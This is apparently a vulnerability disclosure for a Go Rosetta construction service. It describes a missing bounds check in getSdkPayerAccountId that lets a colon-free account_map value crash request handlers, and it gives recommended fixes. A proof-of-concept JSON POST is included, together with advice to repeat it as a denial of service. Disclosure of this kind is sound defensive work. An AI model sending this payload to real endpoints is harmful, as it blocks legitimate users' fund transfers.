### Title
Unauthenticated Out-of-Bounds Panic in `getSdkPayerAccountId` via Colon-Free `account_map` Metadata Entry

### Summary
In `getSdkPayerAccountId`, after a `strings.HasPrefix` guard passes, the code unconditionally accesses `mapping[1]` on the result of `strings.Split(aliasMap, ":")`. If an alias entry in the user-supplied `account_map` metadata contains no `:` separator, `strings.Split` returns a single-element slice and `mapping[1]` triggers a Go runtime index-out-of-bounds panic. Any unauthenticated caller of `/construction/payloads` can supply this crafted metadata, crashing the request goroutine and blocking alias-based fund transfers.

### Finding Description
**Exact location:** `rosetta/app/services/construction_service.go`, function `getSdkPayerAccountId`, lines 491–500.

```go
for aliasMap := range strings.SplitSeq(accountMap, ",") {
    if !strings.HasPrefix(aliasMap, payerAlias) {
        continue
    }
    // ← no check that aliasMap contains ":"
    mapping := strings.Split(aliasMap, ":")          // line 497
    if payer, err = hiero.AccountIDFromString(mapping[1]); err != nil {  // line 498 — PANIC if len==1
        return zero, errors.ErrInvalidAccount
    }
    break
}
```

**Root cause:** The code assumes every entry that passes the `HasPrefix` guard is well-formed (`alias:accountId`). It never verifies `len(mapping) >= 2` before indexing `mapping[1]`.

**How `accountMapMetadata` reaches this code:** In `ConstructionPayloads` (line 243), the value is taken verbatim from the caller's request body:

```go
payer, rErr := c.getSdkPayerAccountId(signers[0], request.Metadata[metadataKeyAccountMap])
```

`request.Metadata` is a `map[string]any` deserialized directly from the JSON POST body — no server-side sanitization is applied before this call.

**Exploit flow:**
1. Attacker sends a POST to `/construction/payloads` with an alias-type payer account (e.g., alias string `"0xABCD"`).
2. Attacker sets `"account_map": "0xABCD"` in `metadata` (starts with the alias, no colon).
3. `payerAccountId.HasAlias()` → `true`; nil/type checks pass.
4. Loop iteration: `aliasMap = "0xABCD"`.
5. `strings.HasPrefix("0xABCD", "0xABCD")` → `true` — guard bypassed.
6. `strings.Split("0xABCD", ":")` → `["0xABCD"]` (length 1).
7. `mapping[1]` → **runtime panic: index out of range [1] with length 1**.

**Why existing checks are insufficient:**
- The `nil` check (line 480) and type assertion (line 484–487) only guard against absent or non-string metadata — not malformed string content.
- The `HasPrefix` check (line 492) is a necessary but not sufficient guard; it confirms the entry is relevant but says nothing about its structure.
- No `strings.Contains(aliasMap, ":")` or `len(mapping) >= 2` check exists anywhere before `mapping[1]`.

### Impact Explanation
A Go runtime panic in an HTTP handler goroutine causes that request to fail (500 / connection drop). Go's `net/http` server recovers per-goroutine panics, so the process itself survives, but every alias-based `/construction/payloads` call can be individually aborted. An attacker who continuously fires this request prevents any alias-account holder from obtaining signing payloads, effectively blocking alias-based fund transfers for the duration of the attack. Because the Rosetta Construction API is the only path to building and submitting transactions, this constitutes a targeted denial-of-service against alias users.

### Likelihood Explanation
The `/construction/payloads` endpoint is unauthenticated and publicly reachable by design (Rosetta spec). No account, key, or privileged credential is required. The attacker only needs to know (or guess) any valid alias string — which is derivable from public key material or from a prior `/construction/preprocess` call. The attack is trivially repeatable with a single HTTP request and requires no on-chain state.

### Recommendation
Add a bounds check immediately after splitting, before accessing `mapping[1]`:

```go
mapping := strings.Split(aliasMap, ":")
if len(mapping) < 2 {
    return zero, errors.ErrInvalidAccount
}
if payer, err = hiero.AccountIDFromString(mapping[1]); err != nil {
    return zero, errors.ErrInvalidAccount
}
```

Alternatively, use `strings.Cut(aliasMap, ":")` which returns `(before, after, found bool)` and makes the missing-separator case explicit:

```go
_, accountIdStr, found := strings.Cut(aliasMap, ":")
if !found {
    return zero, errors.ErrInvalidAccount
}
if payer, err = hiero.AccountIDFromString(accountIdStr); err != nil {
    return zero, errors.ErrInvalidAccount
}
```

### Proof of Concept
```
POST /construction/payloads
Content-Type: application/json

{
  "network_identifier": { "blockchain": "Hedera", "network": "testnet" },
  "operations": [
    {
      "operation_identifier": { "index": 0 },
      "type": "CRYPTOTRANSFER",
      "account": { "address": "0xABCD1234" },   // alias-type account
      "amount": { "value": "-100", "currency": { "symbol": "HBAR", "decimals": 8 } }
    }
  ],
  "metadata": {
    "node_account_id": "0.0.3",
    "valid_duration": "120",
    "valid_start": "1700000000000000000",
    "account_map": "0xABCD1234"   // ← alias prefix, NO colon, no account id part
  }
}
```

Expected result: Go runtime panic `index out of range [1] with length 1` in `getSdkPayerAccountId` at [1](#0-0) , request goroutine aborts, HTTP 500 returned. Repeat indefinitely to deny alias-based transaction construction. The vulnerable call site where unsanitized user input reaches the function is at [2](#0-1) .

### Citations

**File:** rosetta/app/services/construction_service.go (L243-243)
```go
	payer, rErr := c.getSdkPayerAccountId(signers[0], request.Metadata[metadataKeyAccountMap])
```

**File:** rosetta/app/services/construction_service.go (L497-499)
```go
		mapping := strings.Split(aliasMap, ":")
		if payer, err = hiero.AccountIDFromString(mapping[1]); err != nil {
			return zero, errors.ErrInvalidAccount
```
